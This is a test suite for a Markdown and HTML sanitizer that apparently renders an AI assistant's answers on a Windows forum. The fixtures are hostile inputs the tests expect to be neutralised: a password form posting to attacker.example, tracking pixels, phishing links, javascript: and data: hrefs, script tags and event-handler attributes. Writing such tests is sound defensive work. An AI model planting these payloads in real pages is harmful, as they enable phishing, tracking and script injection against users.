import { describe, expect, it } from 'vitest';
import { sanitizeAndParse } from '../utils/helpers';

describe('sanitizeAndParse security boundary', () => {
  it('renders hostile raw HTML as inert text and blocks attacker-controlled image requests', () => {
    const output = sanitizeAndParse(`
<form action="https://attacker.example/collect" style="position:fixed;inset:0">
  <input name="password">
  <button type="submit">Continue</button>
</form>
<iframe src="https://attacker.example/frame"></iframe>
<svg><a href="https://attacker.example/svg">click</a></svg>
<img src="https://attacker.example/tracker.png" style="position:fixed">

![tracking pixel](https://attacker.example/markdown-pixel.png)
`);

    const rendered = document.createElement('div');
    rendered.innerHTML = output;

    expect(rendered.querySelector('form, input, button, iframe, svg, img')).toBeNull();
    expect(rendered.querySelector('[style]')).toBeNull();
    // The anchor nested in the <svg> must not survive as a live link either.
    expect(rendered.querySelector('a[href*="attacker.example"]')).toBeNull();
    expect(rendered.textContent).toContain('<form');
    expect(rendered.textContent).toContain('<img');
  });

  it('renders an approved raw HTML <img> from the CDN, whatever the attribute order', () => {
    const output = sanitizeAndParse(
      'Here is a walkthrough:\n\n'
      + '<img src="https://data.windowsforum.com/images/ai/answers/d19b05d42604.webp" alt="Animated walkthrough">\n\n'
      + '<img alt="Reversed order" src="https://windowsforum.com/images/ai/screenshots/x.png">'
    );
    const rendered = document.createElement('div');
    rendered.innerHTML = output;
    const images = [...rendered.querySelectorAll('img')];

    expect(images).toHaveLength(2);
    expect(images[0].getAttribute('src')).toBe('https://data.windowsforum.com/images/ai/answers/d19b05d42604.webp');
    expect(images[0].getAttribute('alt')).toBe('Animated walkthrough');
    expect(images[1].getAttribute('src')).toBe('https://windowsforum.com/images/ai/screenshots/x.png');
    // The approved raw <img> carries no style/on* handlers.
    expect(rendered.querySelector('[style], [onerror], [onload]')).toBeNull();
  });

  it('keeps a raw <img> from an unapproved origin or path inert (rendered as text)', () => {
    const output = sanitizeAndParse(
      '<img src="https://data.windowsforum.com.attacker.example/images/ai/answers/x.webp" alt="evil">\n\n'
      + '<img src="https://data.windowsforum.com/uploads/evil.webp" alt="wrong path">'
    );
    const rendered = document.createElement('div');
    rendered.innerHTML = output;

    // Lookalike origin and wrong path never render as an image element.
    expect(rendered.querySelector('img')).toBeNull();
    expect(rendered.textContent).toContain('<img');
  });

  it('approves any windowsforum.com subdomain but rejects look-alike hosts', () => {
    const output = sanitizeAndParse(
      '<img src="https://cdn.windowsforum.com/images/ai/answers/a.webp" alt="cdn">\n\n'
      + '<img src="https://media.eu.windowsforum.com/images/ai/screenshots/b.png" alt="nested">\n\n'
      + '<img src="https://windowsforum.com/images/ai/answers/c.webp" alt="apex">\n\n'
      + '<img src="https://notwindowsforum.com/images/ai/answers/d.webp" alt="suffix bypass">\n\n'
      + '<img src="https://windowsforum.com.attacker.example/images/ai/answers/e.webp" alt="prefix bypass">'
    );
    const rendered = document.createElement('div');
    rendered.innerHTML = output;
    const sources = [...rendered.querySelectorAll('img')].map(image => image.getAttribute('src'));

    expect(sources).toEqual([
      'https://cdn.windowsforum.com/images/ai/answers/a.webp',
      'https://media.eu.windowsforum.com/images/ai/screenshots/b.png',
      'https://windowsforum.com/images/ai/answers/c.webp',
    ]);
  });

  it('re-emits an approved raw <img> cleanly, dropping event-handler attributes', () => {
    const output = sanitizeAndParse(
      '<img src="https://data.windowsforum.com/images/ai/answers/x.webp" onerror="alert(1)" onload="x()">'
    );
    const rendered = document.createElement('div');
    rendered.innerHTML = output;
    const image = rendered.querySelector('img');

    // Approved src → the image renders, but only src/alt survive the rebuild.
    expect(image).not.toBeNull();
    expect(image?.getAttribute('src')).toBe('https://data.windowsforum.com/images/ai/answers/x.webp');
    expect(image?.getAttribute('onerror')).toBeNull();
    expect(image?.getAttribute('onload')).toBeNull();
  });

  it('preserves supported Markdown, safe links, citations, and approved AI images', () => {
    const output = sanitizeAndParse(`
**Bold** [OpenAI](https://openai.com/docs?q=chat)

| A | B |
| - | - |
| 1 | 2 |

\`\`\`ts
const answer = 42;
\`\`\`

[example.com](https://example.com/path_(nested))

https://windowsforum.com/images/ai/screenshots/example.webp

https://test.windowsforum.com/images/ai/answers/example.png
`);

    expect(output).toContain('<strong>Bold</strong>');
    expect(output).toContain('href="https://openai.com/docs?q=chat"');
    expect(output).toContain('<table>');
    expect(output).toContain('<code class="language-ts">');
    expect(output).toContain('Sources:');
    expect(output).toContain('href="https://example.com/path_(nested)"');
    expect(output).toContain('src="https://windowsforum.com/images/ai/screenshots/example.webp"');
    expect(output).toContain('src="https://test.windowsforum.com/images/ai/answers/example.png"');
  });

  it('extracts citations from Markdown tokens without rewriting code or duplicating sources', () => {
    const output = sanitizeAndParse(`
\`(not-a-source.example.com)\`

[example.com](https://example.com/path_(nested)) and [example.com](https://example.com/path_(nested)).

(docs.example.org/reference?q=chat)
`);
    const rendered = document.createElement('div');
    rendered.innerHTML = output;

    expect(rendered.querySelector('code')?.textContent).toBe('(not-a-source.example.com)');
    expect([...rendered.querySelectorAll('sup')].map(node => node.textContent)).toEqual(['[1]', '[1]', '[2]']);
    expect(rendered.querySelectorAll('a[href="https://example.com/path_(nested)"]')).toHaveLength(1);
    expect(rendered.querySelectorAll('a[href="https://docs.example.org/reference?q=chat"]')).toHaveLength(1);
  });

  it('allows image requests only to the exact approved origins and paths', () => {
    const output = sanitizeAndParse(`
![lookalike](https://windowsforum.com.attacker.example/images/ai/screenshots/pixel.png)
![insecure](http://windowsforum.com/images/ai/screenshots/pixel.png)
![traversal](https://windowsforum.com/images/ai/screenshots/../../pixel.png)
![data](data:image/svg+xml;base64,PHN2Zz4=)
![approved](https://windowsforum.com/images/ai/walkthroughs/step.jpg?v=2)
`);
    const rendered = document.createElement('div');
    rendered.innerHTML = output;
    const images = [...rendered.querySelectorAll('img')];

    expect(images).toHaveLength(1);
    expect(images[0].getAttribute('src')).toBe('https://windowsforum.com/images/ai/walkthroughs/step.jpg?v=2');
  });
});

const APPROVED_IMAGE = 'https://data.windowsforum.com/images/ai/answers/90a23a79c775.webp';

const render = (markdown: string): HTMLDivElement => {
  const rendered = document.createElement('div');
  rendered.innerHTML = sanitizeAndParse(markdown);
  return rendered;
};

describe('raw HTML the assistant emits', () => {
  it('renders an approved <img> whose alt contains ">"', () => {
    // The exact shape the backend instructs the model to emit; Windows
    // breadcrumb captions routinely carry ">".
    const rendered = render(`<img src="${APPROVED_IMAGE}" alt="Task Manager > Startup apps">`);
    const image = rendered.querySelector('img');

    expect(image?.getAttribute('src')).toBe(APPROVED_IMAGE);
    expect(image?.getAttribute('alt')).toBe('Task Manager > Startup apps');
    expect(rendered.textContent).not.toContain('<img');
  });

  it('keeps parsing Markdown after a raw <img> line', () => {
    const rendered = render(`<img src="${APPROVED_IMAGE}" alt="ok">\n### Free up storage\n\nBody text.`);

    expect(rendered.querySelectorAll('img')).toHaveLength(1);
    expect(rendered.querySelector('h3')?.textContent).toBe('Free up storage');
    expect([...rendered.querySelectorAll('p')].map(node => node.textContent)).toContain('Body text.');
  });

  it('renders a raw <a> as a safe external link', () => {
    const rendered = render('See <a href="https://openai.com/docs">the docs</a> now.');
    const link = rendered.querySelector('a');

    expect(link?.getAttribute('href')).toBe('https://openai.com/docs');
    expect(link?.getAttribute('target')).toBe('_blank');
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer');
    expect(link?.textContent).toBe('the docs');
  });

  it('enumerates a raw <a> in Sources exactly like a Markdown link', () => {
    const rendered = render('Per <a href="https://docs.example.org/ref">docs.example.org</a> reboot.');

    expect([...rendered.querySelectorAll('sup')].map(node => node.textContent)).toEqual(['[1]']);
    expect(rendered.querySelectorAll('a[href="https://docs.example.org/ref"]')).toHaveLength(1);
    expect(rendered.textContent).toContain('Sources:');
  });

  it('renders raw inline formatting, <br> and lists', () => {
    const rendered = render(
      'Use <strong>Settings</strong>, run <code>sfc /scannow</code>, then <em>reboot</em>.<br>Next:\n\n'
      + '<ul>\n<li>Open **Settings**</li>\n<li>Click <a href="https://openai.com">here</a></li>\n</ul>'
    );

    expect(rendered.querySelector('strong')?.textContent).toBe('Settings');
    expect(rendered.querySelector('code')?.textContent).toBe('sfc /scannow');
    expect(rendered.querySelector('em')?.textContent).toBe('reboot');
    expect(rendered.querySelector('br')).not.toBeNull();
    expect([...rendered.querySelectorAll('ul > li')]).toHaveLength(2);
    // List items are re-lexed, so Markdown and raw anchors inside them work.
    expect(rendered.querySelector('li strong')?.textContent).toBe('Settings');
    expect(rendered.querySelector('li a')?.getAttribute('href')).toBe('https://openai.com');
  });

  it('never lets an unbalanced <a> capture the rest of the message', () => {
    // Left live, the HTML5 adoption agency re-opens the anchor in every later
    // block, wrapping the whole answer — and the Sources footer — in one
    // attacker-controlled link.
    const rendered = render(
      '<a href="https://microsoft-support.attacker.example/fix">\n\n'
      + '## How to fix the error\n\n1. Open **Settings**\n\n[Docs](https://learn.microsoft.com/x)'
    );

    expect(rendered.querySelectorAll('a[href*="attacker.example"]')).toHaveLength(0);
    expect(rendered.querySelector('h2')?.closest('a')).toBeNull();
    expect(rendered.querySelector('ol')?.closest('a')).toBeNull();
    expect(rendered.textContent).toContain('<a href');
  });

  it('keeps nested and stray anchors inert', () => {
    const nested = render('<a href="https://a.example">x <a href="https://b.example">y</a> z</a>');
    expect(nested.querySelector('a[href="https://a.example"]')).toBeNull();
    expect(nested.textContent).toContain('<a href');

    const unbalancedList = render('<ul>\n<li>ok</li>\n<script>alert(1)</script>\n</ul>');
    expect(unbalancedList.querySelector('ul, script')).toBeNull();
    expect(unbalancedList.textContent).toContain('<script>');
  });

  it('rejects unsafe hrefs on raw anchors', () => {
    const hostileHrefs = [
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      '//evil.example/x',
      'vbscript:msgbox(1)',
    ];

    for (const href of hostileHrefs) {
      const rendered = render(`<a href="${href}">Continue</a>`);
      expect(rendered.querySelector('a')).toBeNull();
    }
  });

  it('does not let an allowed tag smuggle itself out of an escaped region', () => {
    // The surrounding markup is only escaped, so an anchor inside it must not
    // be promoted to a live link.
    const smuggled = [
      '<!-- internal note: <a href="https://attacker.example/creds">Verify your account</a> -->',
      '<form action="https://attacker.example">\n<a href="https://attacker.example/creds">Sign in</a>\n</form>',
      '<pre>\n<a href="https://attacker.example">not really code</a>\n</pre>',
    ];

    for (const markdown of smuggled) {
      const rendered = render(markdown);
      expect(rendered.querySelector('a')).toBeNull();
      expect(rendered.textContent).toContain('<a href');
    }
  });

  it('strips hostile attributes from a raw anchor', () => {
    const rendered = render(
      '<a href="https://openai.com" target="_top" onclick="evil()" rel="opener" class="wf-x">Docs</a>'
    );
    const link = rendered.querySelector('a');

    expect(link?.getAttribute('target')).toBe('_blank');
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer');
    expect(link?.getAttribute('onclick')).toBeNull();
    expect(link?.getAttribute('class')).toBeNull();
  });

  it('fails closed on malformed <img> markup', () => {
    // A tag the parser cannot read is escaped rather than guessed at, so none
    // of its attributes reach the DOM. (A bare approved image URL left over
    // inside the escaped text may still autolink — that is the separate,
    // deliberate behaviour asserted above.)
    const malformed = [
      `<img/src="${APPROVED_IMAGE}">`,
      `<img src="${APPROVED_IMAGE}"alt="a">`,
      `<img src="${APPROVED_IMAGE}" alt="a"">`,
    ];

    for (const markdown of malformed) {
      const rendered = render(markdown);
      expect(rendered.querySelector('img[alt="a"]')).toBeNull();
      expect(rendered.querySelector('[onerror], [onload]')).toBeNull();
      expect(rendered.textContent).toContain('<img');
    }
  });

  it('leaves <img> and <a> lines inside code blocks literal', () => {
    // The reason raw tags are recognized by tokenizer extensions rather than a
    // pre-parse rewrite: fenced and indented code must stay byte-exact.
    const snippet = `<img src="${APPROVED_IMAGE}" alt="a">\n<a href="https://openai.com">x</a>`;
    const blocks = [
      '```html\n' + snippet + '\n```',
      '```\n' + snippet + '\n```',
      '~~~\n' + snippet + '\n~~~',
      snippet.split('\n').map(line => `    ${line}`).join('\n'),
    ];

    for (const markdown of blocks) {
      const rendered = render(markdown);
      expect(rendered.querySelector('img')).toBeNull();
      expect(rendered.querySelector('a')).toBeNull();
      expect(rendered.querySelector('pre > code')?.textContent).toBe(`${snippet}\n`);
    }
  });

  it('handles attribute order, quoting and case variants', () => {
    const upper = render(`<A HREF='https://openai.com/docs'>Docs</A>`);
    expect(upper.querySelector('a')?.getAttribute('href')).toBe('https://openai.com/docs');

    const selfClosing = render(`<img alt="Settings > System" src="${APPROVED_IMAGE}" />`);
    expect(selfClosing.querySelector('img')?.getAttribute('alt')).toBe('Settings > System');

    const noAlt = render(`<img src="${APPROVED_IMAGE}">`);
    expect(noAlt.querySelector('img')?.getAttribute('alt')).toBe('Windows screenshot');

    const inline = render(`Here <img src="${APPROVED_IMAGE}" alt="mid"> and more text.`);
    expect(inline.querySelector('p > img')).not.toBeNull();
    expect(inline.querySelector('p')?.textContent).toContain('and more text.');
  });

  it('renders raw tags nested in lists, tables and blockquotes', () => {
    const rendered = render(
      `- <img src="${APPROVED_IMAGE}" alt="in list">\n\n`
      + '| A | B |\n| - | - |\n| <a href="https://openai.com">cell</a> | x |\n\n'
      + '> Quoted <strong>bold</strong> text'
    );

    expect(rendered.querySelector('li img')?.getAttribute('alt')).toBe('in list');
    expect(rendered.querySelector('td a')?.getAttribute('href')).toBe('https://openai.com');
    expect(rendered.querySelector('blockquote strong')?.textContent).toBe('bold');
  });

  it('does not mistake an image-only link label for a citation', () => {
    const rawAnchor = render(`<a href="https://openai.com"><img src="${APPROVED_IMAGE}" alt="a"></a>`);
    expect(rawAnchor.querySelector('sup')).toBeNull();
    expect(rawAnchor.querySelector('a > img')).not.toBeNull();

    const markdown = render('[![shot](https://windowsforum.com/images/ai/answers/a.webp)](https://example.com/x)');
    expect(markdown.querySelector('sup')).toBeNull();
    expect(markdown.textContent).not.toContain('Sources:');
  });
});
